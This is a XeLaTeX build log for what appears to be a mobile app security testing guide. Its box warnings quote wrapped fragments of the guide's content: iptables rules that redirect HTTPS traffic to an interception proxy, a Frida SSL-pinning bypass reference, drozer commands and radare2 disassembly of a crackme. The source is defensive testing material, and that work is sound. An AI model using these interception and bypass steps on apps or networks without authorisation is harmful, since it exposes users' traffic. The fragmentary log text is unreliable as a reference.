(/usr/share/texlive/texmf-dist/tex/latex/needspace/needspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/md-frame-0.mdf))
(/texmf/tex/latex/sourcesanspro/sourcesanspro.sty)
(/texmf/tex/latex/sourcecodepro/sourcecodepro.sty)
(/usr/share/texlive/texmf-dist/tex/latex/titling/titling.sty)

Class scrartcl Warning: Usage of package `fancyhdr' together
(scrartcl)              with a KOMA-Script class is not recommended.
(scrartcl)              I'd suggest to use 
(scrartcl)              package `scrlayer-scrpage'.
(scrartcl)              Nevertheless, using requested
(scrartcl)              package `fancyhdr' on input line 362.

(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
(/tmp/tex2pdf.-b81d3c9506d190f0/input.aux)
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/nameref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/gettitlestring.sty))
*geometry* driver: auto-detecting
*geometry* detected driver: xetex
ABD: EveryShipout initializing macros

Package caption Warning: \caption will not be redefined since it's already
(caption)                redefined by a document class or package which is
(caption)                unknown to the caption package.
See the caption package documentation for explanation.

<use  "cover.jpg" > [1]

Class scrartcl Warning: incompatible usage of \@ssect detected.
(scrartcl)              You've used the KOMA-Script implementation of \@ssect
(scrartcl)              from within a non compatible caller, that does not
(scrartcl)              \scr@s@ct@@nn@m@ locally.
(scrartcl)              This could result in several error messages on input li
ne 415.

[2] (/tmp/tex2pdf.-b81d3c9506d190f0/input.toc
(/usr/share/texmf/tex/latex/lm/omllmm.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msa.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msb.cfg) [3]
Underfull \hbox (badness 3690) in paragraph at lines 112--112
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Testing Two-Factor Authentication and St
ep-up Authentication (MSTG-AUTH-9 and 

Underfull \hbox (badness 2150) in paragraph at lines 154--154
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Making Sure that Critical Operations Use
 Secure Communication Channels (MSTG- 
[4]
Overfull \hbox (0.10948pt too wide) detected at line 373
 []\TU/SourceSansPro(0)/m/n/10.95 308

Overfull \hbox (0.10948pt too wide) detected at line 375
 []\TU/SourceSansPro(0)/m/n/10.95 309

Overfull \hbox (0.10948pt too wide) detected at line 376
 []\TU/SourceSansPro(0)/m/n/10.95 309

Underfull \hbox (badness 1509) in paragraph at lines 404--404
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether the Keyboard Cache I
s Disabled for Text Input Fields (MSTG- 

Underfull \hbox (badness 1221) in paragraph at lines 408--408
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether Sensitive Stored Dat
a Has Been Exposed via IPC Mechanisms 
[5]
Overfull \hbox (0.35037pt too wide) detected at line 546
 []\TU/SourceSansPro(0)/m/n/10.95 409

Overfull \hbox (0.14233pt too wide) detected at line 628
 []\TU/SourceSansPro(0)/m/n/10.95 448
[6]
Overfull \hbox (0.35037pt too wide) detected at line 654
 []\TU/SourceSansPro(0)/m/n/10.95 460

Overfull \hbox (0.35037pt too wide) detected at line 655
 []\TU/SourceSansPro(0)/m/n/10.95 460

Overfull \hbox (0.25183pt too wide) detected at line 710
 []\TU/SourceSansPro(0)/m/n/10.95 500

Overfull \hbox (0.72267pt too wide) detected at line 714
 []\TU/SourceSansPro(0)/bx/n/10.95 502

Overfull \hbox (0.10948pt too wide) detected at line 724
 []\TU/SourceSansPro(0)/m/n/10.95 508

Overfull \hbox (0.10948pt too wide) detected at line 784
 []\TU/SourceSansPro(0)/m/n/10.95 560

Overfull \hbox (0.10948pt too wide) detected at line 799
 []\TU/SourceSansPro(0)/m/n/10.95 580
[7]
Overfull \hbox (0.20802pt too wide) detected at line 890
 []\TU/SourceSansPro(0)/m/n/10.95 648

Overfull \hbox (0.20802pt too wide) detected at line 891
 []\TU/SourceSansPro(0)/m/n/10.95 648

Overfull \hbox (0.27373pt too wide) detected at line 926
 []\TU/SourceSansPro(0)/m/n/10.95 666

Overfull \hbox (0.27373pt too wide) detected at line 927
 []\TU/SourceSansPro(0)/m/n/10.95 666

Overfull \hbox (0.27373pt too wide) detected at line 928
 []\TU/SourceSansPro(0)/m/n/10.95 666

Underfull \hbox (badness 10000) in paragraph at lines 1011--1011
 [][] []\TU/SourceSansPro(0)/m/n/10.95 Determining Whether Native Methods Are E
xposed Through WebViews (MSTG- 
[8]
Overfull \hbox (0.35037pt too wide) detected at line 1152
 []\TU/SourceSansPro(0)/m/n/10.95 840

Overfull \hbox (0.14233pt too wide) detected at line 1156
 []\TU/SourceSansPro(0)/m/n/10.95 844

Overfull \hbox (0.14233pt too wide) detected at line 1157
 []\TU/SourceSansPro(0)/m/n/10.95 844
[9]) [10]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c9ef3f29742285f2d7e09d0c076a66855521a28.
png" > [11]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/997b3fc8f69d8fa1fd9853b14a99a208461549eb.
png" > [12] [13] [14] [15]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ccba17705245f8560d8a34338e189f56fd492cf8.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be368d70157fbfbee3a68fb706425b2117ca985a.
png" > [16] [17] [18] [19]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db1eb1182c61b69cf4140a62eec441c2a36e2252.
jpg" > [20] [21] [22] [23] [24] [25] [26] [27] [28] [29]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/29ee4afc5b34f4de27f808c55317ab17b193fa4c.
png" > [30] [31] [32] [33] [34] [35]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ac849125c0802c1919c86dd62f13c49723742af.
jpg" > [36] [37] [38]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/28bf4372b490e7da769b83110e865b5dfbbac14d.
jpg" > [39]
Underfull \hbox (badness 1852) in paragraph at lines 2081--2090
[]\TU/SourceSansPro(0)/m/n/10.95 Infrastructure as Code also facilitates the co
nstruction of the environments required by classical

Underfull \hbox (badness 1655) in paragraph at lines 2081--2090
\TU/SourceSansPro(0)/m/n/10.95 software creation projects, for \TU/SourceSansPr
o(0)/bx/n/10.95 development \TU/SourceSansPro(0)/m/n/10.95 (“DEV”), \TU/SourceS
ansPro(0)/bx/n/10.95 integration \TU/SourceSansPro(0)/m/n/10.95 (“INT”), \TU/So
urceSansPro(0)/bx/n/10.95 testing \TU/SourceSansPro(0)/m/n/10.95 (“PPR” for Pre
-
[40] [41]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/475043742486ea4fadf4922cde94a2395cceba4a.
jpg" > [42] [43] [44] [45]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b8545a63bbbd33e84277034f5674e52d35eb224c.
png" > [46] [47]
Underfull \hbox (badness 5908) in paragraph at lines 2610--2613
[]\TU/SourceSansPro(0)/m/n/10.95 Universal Android SSL Pinning Bypass with Frid
a - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][] [] [][][]
[][][][][][][][] []
[48] [49]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9a0c01a9582fcd5d3aac500e683e7ba7cfbab2fe.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/186d6939c74e4d7ed97a499be236f2eae40edfb4.
png" > [50]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/222cb525d0a89b02ee9868add6220f38f7d8eec4.
png" > [51]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f5ea8252ffeab6775a9e3cc315bf3623aacaa026.
png" > [52]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7565cd5bcb1af1b7f77b1001570b2035da0e0358.
png" > [53]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/54f39a0e594a78d2ceefec1465e3e353b39e1f8e.
png" > [54] [55] [56] [57]
Underfull \hbox (badness 1342) in paragraph at lines 2987--2990
[]\TU/SourceSansPro(0)/m/n/10.95 [#vadla] Ole André Vadla Ravnås, Anatomy of a 
code tracer - [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][]
 []

Underfull \hbox (badness 3449) in paragraph at lines 2990--2993
\TU/SourceSansPro(0)/m/n/10.95 chine based software protections - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][][][][][][][] [] [][][] [] [][][][][] [] [][][
][][][][][] [][] [][][] [][] [][][][][][][] [][]
[58] [59] [60] [61] [62]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5adbeedbb4e9578327329ff2b30517e548450d8e.
png" > [63]
Overfull \hbox (119.56647pt too wide) in paragraph at lines 3368--3371
[]\TU/SourceSansPro(0)/m/n/10.95 Take the SHA-1 hash of the result of step 1 (e
.g.: the hash of \TU/SourceCodePro(6)/m/n/10.95 test \TU/SourceSansPro(0)/m/n/1
0.95 is \TU/SourceCodePro(6)/m/n/10.95 A94A8FE5CCB19BA61C4C0873D391E987982FBBD3
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (72.01427pt too wide) in paragraph at lines 3375--3382
[]\TU/SourceSansPro(0)/m/n/10.95 Iterate through the result and look for the re
st of the hash (e.g. is \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4C0873D391E
987982FBBD3

Overfull \hbox (194.01184pt too wide) in paragraph at lines 3375--3382
\TU/SourceSansPro(0)/m/n/10.95 will return a counter showing how many times it 
has been found in breaches (e.g.: \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4
C0873D391E987982FBBD3:76479\TU/SourceSansPro(0)/m/n/10.95 ). 
[64]
Underfull \hbox (badness 1107) in paragraph at lines 3471--3476
[]\TU/SourceSansPro(0)/m/n/10.95 Load or paste the list of passwords you want t
o try. There are several resources available
[65]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ef35163475f90699bc1e3dc9c0670e1dcb0a0f68.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b817d1ce3fb5ecf5ff181554fb12a94aaec6e01.
png" > [66] [67] [68] [69] [70]
Underfull \hbox (badness 10000) in paragraph at lines 3840--3846

[71]
Underfull \hbox (badness 1052) in paragraph at lines 3878--3881
[]\TU/SourceSansPro(0)/m/n/10.95 There are various two-factor authentication me
chanism available which can range from 3rd party
[72]
Overfull \hbox (62.69936pt too wide) in paragraph at lines 3940--3940
[]\TU/SourceCodePro(6)/m/n/10.95 <base64UrlEncode(header)>.<base64UrlEncode(pay
load)>.<base64UrlEncode(signature)>[] 

Overfull \hbox (509.45926pt too wide) in paragraph at lines 3947--3947
[]\TU/SourceCodePro(6)/m/n/10.95 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiO
iIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30R
MHrHDcEfxjoYZgeFONFh7HgQ[] 
[73] [74] [75] [76]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/de11985a944d62f6043f7925b67f1282123b016d.
png" > [77] [78] [79]
Underfull \hbox (badness 2237) in paragraph at lines 4467--4475
[]\TU/SourceSansPro(0)/m/n/10.95 In all cases, you should verify whether differ
ent devices are detected correctly. Therefore, the

Underfull \hbox (badness 2158) in paragraph at lines 4467--4475
\TU/SourceSansPro(0)/m/n/10.95 binding of the application to the actual device 
should be tested. In iOS, a developer can use

Underfull \hbox (badness 1377) in paragraph at lines 4467--4475
\TU/SourceCodePro(6)/m/n/10.95 identifierForVendor\TU/SourceSansPro(0)/m/n/10.9
5 , which is related to the bundle ID: the moment you change a bundle
[80] [81] [82]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/885ac03015d3917ef0a32901cacaf58cedaef149.
png" > [83] [84] [85]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c3af2e2ee692b1d4abd115bece49476248ffa13d.
png" > [86] [87]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/23e89c95e9bb3113d34778f0cba467e2ded7bdb9.
png" > [88] [89]
Overfull \hbox (104.30946pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 # iptables will NAT connections from AP ne
twork interface to the target network interface[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 $ iptables --table nat --append POSTROUTIN
G --out-interface wlan0 -j MASQUERADE[] 
[90] [91]
Overfull \hbox (141.53944pt too wide) in paragraph at lines 5153--5153
[]    \TU/SourceCodePro(6)/m/n/10.95 $ sudo iptables -t nat -A PREROUTING -p tc
p --dport 443 -j DNAT --to-destination 127.0.0.1:8080[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db6c108c5b7ef9e975feeffbd8dfd088fe39edea.
png" > [92] [93]
Overfull \hbox (111.09839pt too wide) in paragraph at lines 5294--5296
[]\TU/SourceSansPro(0)/m/n/10.95 Cipher suites have the following structure: \T
U/SourceSansPro(0)/bx/n/10.95 Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_In
tegrityCheckAlgorithm 
[94] [95] [96] [97] [98]
Underfull \hbox (badness 10000) in paragraph at lines 5691--5694
[]\TU/SourceSansPro(0)/m/n/10.95 Android supported Cipher suites - [][]$[][][][
][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 5726--5728
[]\TU/SourceSansPro(0)/m/n/10.95 Recommendations for a cipher string - [][]$[][
][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][][][]
[][][][][] [] [][][][] []
[99]
Underfull \hbox (badness 10000) in paragraph at lines 5739--5742
[] [] [][][] [] [][][][][][][][][][][] [] [][][] [] [][][] [][] [][][][][][][][
] [][] [][][] [][] [][][] [][] [][][][][][] [][] [][][][][][][][] [][] [][][][]
[][][] [][] [][][] [][] [][][][] [][] [][] [][] [] [][] [][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 5759--5761
[][][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][][] [] [][][] [] [][]
 [] [][] [] [][][][][][][] [] [][][][][][] [] [][][][][][][] [][] [][][] [][] [
][][][][][][][] [][] [][][][][] [][] [][][][][] [][]
[100] [101] [102] [103]
Overfull \hbox (145.9194pt too wide) in paragraph at lines 6061--6061
[]\TU/SourceCodePro(6)/m/n/10.95 1. The password to the client certificate isn[
]t stored locally or is locked in the device Keychain.[] 
[104] [105] [106]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8c5c6e36f8f96c2a99d646eadbb33514e8031732.
png" > [107] [108] [109] [110] [111] [112] [113] [114]
Overfull \hbox (46.27438pt too wide) in paragraph at lines 6717--6717
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ActionBarContentActivity \[] 

Overfull \hbox (24.37439pt too wide) in paragraph at lines 6725--6725
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ModalContentActivity  \[] 
[115] [116] [117] [118] [119] [120] [121]
Underfull \hbox (badness 10000) in paragraph at lines 7215--7218
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Human Interface Guidelines - [][]$[][][]
[][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][] [][] [][][][][][][][][] [][]
[122]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1f7368a68bdac5245a0c8f7dea8e9f7f271617de.
png" > [123]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b95a89677543656fa89bd7246356c2a701a1d247.
png" > [124] [125] [126] [127] [128] [129]
Overfull \hbox (49.19812pt too wide) in paragraph at lines 7594--7597
[]\TU/SourceSansPro(0)/m/n/10.95 The relationship between group IDs and permiss
ions is defined in the file [][]frameworks/base/data/etc/platform.xml[][] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4f788504cb27937eddb44c2ec5f319b376b249d4.
png" > [130]
Overfull \hbox (86.78952pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  4 u0_a97              u0_a97      
        4096 2017-01-18 14:27 com.android.calendar[] 

Overfull \hbox (78.02954pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  6 u0_a120             u0_a120     
        4096 2017-01-19 12:54 com.android.chrome[] 
[131]
Overfull \hbox (34.22937pt too wide) in paragraph at lines 7730--7730
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 

Overfull \hbox (34.22937pt too wide) in paragraph at lines 7741--7741
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 
[132] [133] [134] [135]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/deb1cf5c3b76357c39b70ee98334d01e70f1ea3b.
jpg" > [136] [137] [138]
Overfull \hbox (48.13965pt too wide) in paragraph at lines 8163--8167
[]\TU/SourceSansPro(0)/m/n/10.95 The other way is to create the receiver dynami
cally in code and register it with the [][]\TU/SourceCodePro(6)/m/n/10.95 Conte
xt.registerReceiver[][]
[139]
Underfull \hbox (badness 4084) in paragraph at lines 8210--8221
[]\TU/SourceSansPro(0)/m/n/10.95 If your app is not supposed to send broadcasts
 across apps, use a Local Broadcast Manager

Underfull \hbox (badness 1590) in paragraph at lines 8210--8221
\TU/SourceSansPro(0)/m/n/10.95 security and the efficiency of the app, as no in
terprocess communication is involved. However,

Underfull \hbox (badness 3354) in paragraph at lines 8228--8236
\TU/SourceSansPro(0)/m/n/10.95 receive \TU/SourceCodePro(6)/m/n/10.95 CONNECTIV
ITY_ACTION \TU/SourceSansPro(0)/m/n/10.95 broadcast unless they register their 
Broadcast Receivers with

Underfull \hbox (badness 4505) in paragraph at lines 8228--8236
\TU/SourceCodePro(6)/m/n/10.95 Context.registerReceiver()\TU/SourceSansPro(0)/m
/n/10.95 . The system does not send \TU/SourceCodePro(6)/m/n/10.95 ACTION_NEW_P
ICTURE \TU/SourceSansPro(0)/m/n/10.95 and

Underfull \hbox (badness 1694) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 no longer register Broadcast Receivers for impli
cit broadcasts in their manifest, except for those

Underfull \hbox (badness 3098) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 listed in [][]Implicit Broadcast Exceptions[][].
 The Broadcast Receivers created at runtime by calling

Overfull \hbox (105.39647pt too wide) in paragraph at lines 8247--8252
[]\TU/SourceSansPro(0)/m/n/10.95 According to [][]Changes to System Broadcasts[
][], beginning with Android 9 (API level 28), the \TU/SourceCodePro(6)/m/n/10.9
5 NETWORK_STATE_CHANGED_ACTION
[140] [141] [142]
Overfull \hbox (6.80698pt too wide) in paragraph at lines 8383--8388
[]\TU/SourceSansPro(0)/m/n/10.95 The above code defines a new permission named 
\TU/SourceCodePro(6)/m/n/10.95 com.permissions.sample.ACCESS_USER_INFO
[143]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b49fc3618488c3a40ee2d09e488dd0d40ac9502f.
png" > [144]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c3c805441548d38b63caf39920079fd1673c545.
png" > [145]
Overfull \hbox (334.2594pt too wide) in paragraph at lines 8550--8550
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -alias myDomain -keyalg RSA 
-keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPasswo
rd[] 
[146]
Overfull \hbox (14.51942pt too wide) in paragraph at lines 8595--8595
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --out mySignedApp.apk --ks my
KeyStore.jks myUnsignedApp.apk[] 
[147] [148]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a92a527830c8d387b73bc3f82eb4c78e331d24dd.
jpg" > [149] [150]
Overfull \hbox (191.90938pt too wide) in paragraph at lines 8856--8856
[]\TU/SourceCodePro(6)/m/n/10.95 $ ./build/tools/make_standalone_toolchain.py -
-arch arm --api 24 --install-dir /tmp/android-7-toolchain[] 

Overfull \hbox (42.80989pt too wide) in paragraph at lines 8858--8864
[]\TU/SourceSansPro(0)/m/n/10.95 This creates a standalone toolchain for Androi
d 7.0 (API level 24) in the directory \TU/SourceCodePro(6)/m/n/10.95 /tmp/andro
id-7-toolchain\TU/SourceSansPro(0)/m/n/10.95 .
[151] [152] [153] [154] [155] [156]
Underfull \hbox (badness 1521) in paragraph at lines 9229--9233
[]\TU/SourceSansPro(0)/m/n/10.95 Frida server: Server for Frida, the dynamic in
strumentation toolkit for developers, reverse-
[157] [158]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9353--9353
[]\TU/SourceCodePro(6)/m/n/10.95 emulator-5554    device product:sdk_google_pho
ne_x86 model:Android_SDK_built_for_x86 device:generic_x86 transport_id:1[] 
[159] [160]
Overfull \hbox (42.98941pt too wide) in paragraph at lines 9468--9468
[]\TU/SourceCodePro(6)/m/n/10.95 I: Loading resource table from file: /Users/sv
en/Library/apktool/framework/1.apk[] 
[161] [162]
Overfull \hbox (23.5873pt too wide) in paragraph at lines 9599--9607
[]\TU/SourceSansPro(0)/m/n/10.95 Again, without drozer this would have required
 several steps. The module \TU/SourceCodePro(6)/m/n/10.95 app.package.attacksur
face
[163] [164]
Overfull \hbox (121.8294pt too wide) in paragraph at lines 9662--9662
[]\TU/SourceCodePro(6)/m/n/10.95 $ dz> run app.broadcast.send --action (broadca
st receiver name) -- extra (number of arguments)[] 
[165] [166]
Overfull \hbox (316.7393pt too wide) in paragraph at lines 9807--9807
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/frida/frida/releases
/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz[] 
[167] [168]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{7ccea78 
G.ED..... ......ID 0,0-0,0 #7f0c01fc app:id/action_bar_black_background}[] 

Overfull \hbox (255.41934pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{2809551 
V.ED..... ........ 0,1731-0,1731 #7f0c01ff app:id/menu_anchor_stub}[] 

Overfull \hbox (353.96931pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{be471b6 
G.ED..... ......I. 0,0-0,0 #7f0c01f5 app:id/location_bar_verbose_status_separat
or}[] 

Overfull \hbox (281.69933pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{3ae0eb7 
V.ED..... ........ 0,0-1080,63 #102002f android:id/statusBarBackground}[] 
[169] [170] [171] [172]
Overfull \hbox (49.5594pt too wide) in paragraph at lines 10152--10152
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/942a2c3a332ff2a3c126cf220ad029722e4d7d8b.
png" > [173] [174] [175] [176] [177] [178] [179]
Overfull \hbox (126.2094pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000073c [0x00000958 - 0x00000abc]    356 cl
ass 5 Lsg/vantagepoint/uncrackable1/MainActivity[] 

Overfull \hbox (25.46983pt too wide) in paragraph at lines 10532--10532
[]                                                                            \
TU/SourceCodePro(6)/m/n/10.95 :: Landroid/app/Activity;[] 

Overfull \hbox (69.2694pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000958 method 0 pC   Lsg/vantagepoint/uncr
ackable1/MainActivity.method.<init>()V[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000970 method 1 P    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.a(Ljava/lang/String;)V[] 

Overfull \hbox (205.04935pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x000009c8 method 2 r    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.onCreate(Landroid/os/Bundle;)V[] 

Overfull \hbox (191.90933pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 method 3 p    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.verify(Landroid/view/View;)V[] 

Overfull \hbox (194.09938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000075c [0x00000acc - 0x00000bb2]    230 cl
ass 6 Lsg/vantagepoint/uncrackable1/a :: Ljava/lang/Object;[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000acc method 0 sp   Lsg/vantagepoint/uncr
ackable1/a.method.a(Ljava/lang/String;)Z[] 

Overfull \hbox (88.97937pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000b5c method 1 sp   Lsg/vantagepoint/uncr
ackable1/a.method.b(Ljava/lang/String;)[B[] 
[180]
Overfull \hbox (259.79942pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 29 0x000005cc    NONE    FUNC Ljava/lang/Str
ingBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder;[] 

Overfull \hbox (108.68944pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 30 0x000005d4    NONE    FUNC Ljava/lang/Str
ingBuilder.method.toString()Ljava/lang/String;[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 32 0x000005e4    NONE    FUNC Ljava/lang/Sys
tem.method.getenv(Ljava/lang/String;)Ljava/lang/String;[] 

Overfull \hbox (240.0894pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 34 0x000005f4    NONE    FUNC Ljavax/crypto/
Cipher.method.getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;[] 

Overfull \hbox (75.83946pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 35 0x000005fc    NONE    FUNC Ljavax/crypto/
Cipher.method.init(ILjava/security/Key;)V[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 36 0x00000604    NONE    FUNC Ljavax/crypto/
spec/SecretKeySpec.method.<init>([BLjava/lang/String;)V[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 sym.Lsg_vantagepoint_uncrackabl
e1_MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (189.71933pt too wide) in paragraph at lines 10575--10575
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 132 method.public.Lsg_vantagepoint_
uncrackable1_MainActivity.Lsg_vantagepoint_uncrackable1[] 

Overfull \hbox (97.73969pt too wide) in paragraph at lines 10575--10575
[]                                                        \TU/SourceCodePro(6)/
m/n/10.95 _MainActivity.method.verify_Landroid_view_View__V[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 10583--10583
[]\TU/SourceCodePro(6)/m/n/10.95 [0x000009c8]> s sym.Lsg_vantagepoint_uncrackab
le1_MainActivity.method.verify_Landroid_view_View__V[] 
[181]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ff8101e999d5401645a7e1396652c25dd93ab67e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1d1be24e834cab37f189d60c9d349789b2bdb0ae.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/853fd16c4f9112caf782ed394cb3bbc36b10900e.
png" > [182]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/74c7cf937d32349f587ab60d3a77f769b2e7ba77.
png" > [183]
Overfull \hbox (40.79942pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f072d89ee hit12_0 unacceptable policyunsu
pported md algorithmvar bad valuec[] 
[184]
Overfull \hbox (34.22949pt too wide) in paragraph at lines 10726--10726
[]\TU/SourceCodePro(6)/m/n/10.95 0x561f0732a91a hit12_1 unacceptableSearching 1
2 bytes: 75 6e 61 63 63 65 70 74 61[] 

Overfull \hbox (1978.94905pt too wide) in paragraph at lines 10741--10741
[]\TU/SourceCodePro(6)/m/n/10.95 {"address":"0x561f072c4223","size":12,"flag":"
hit14_1","content":"unacceptable policyunsupported md algorithmvar bad valuec0"
},{"address":"0x561f072c4275","size":12,"flag":"hit14_2","content":"unacceptabl
eSearching 12 bytes: 75 6e 61 63 63 65 70 74 61"},{"address":"0x561f072c42c8","
size":12,"flag":"hit14_3","content":"unacceptableSearching 12 bytes: 75 6e 61 6
3 63 65 70 74 61 "},[] 
[185] [186]
Overfull \hbox (9.28828pt too wide) in paragraph at lines 10877--10882
[]\TU/SourceSansPro(0)/m/n/10.95 Disconnect the USB cable from the target devic
e and run \TU/SourceCodePro(6)/m/n/10.95 adb connect <device_ip_address>\TU/Sou
rceSansPro(0)/m/n/10.95 .
